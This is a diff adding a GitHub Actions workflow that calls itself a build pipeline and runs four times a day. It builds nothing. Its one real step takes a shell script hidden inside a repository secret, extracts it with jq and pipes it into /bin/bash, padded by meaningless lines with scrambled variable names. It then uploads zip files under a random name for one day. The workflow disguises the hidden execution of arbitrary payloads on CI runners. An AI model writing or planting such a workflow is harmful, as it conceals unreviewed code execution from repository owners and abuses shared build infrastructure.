@@ -1,0 +1,31 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          gempv11: ${{ secrets.gempv11 }}
+        run: |
+          printf '%s' "$gempv11" | jq -r .erpuz14 | /bin/bash
+          echo $jjmj2 | jq -r .nczl1 | /bin/bash
+          echo $djpf86960 | jq -r .xl93 | /bin/bash
+          echo $wwf14 | jq -r .kduxo57602 | /bin/bash
+          printf '%s' "$z15" | jq -r .zyz1 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: dQYCEKLn
+          path: "*.zip"
+          retention-days: 1
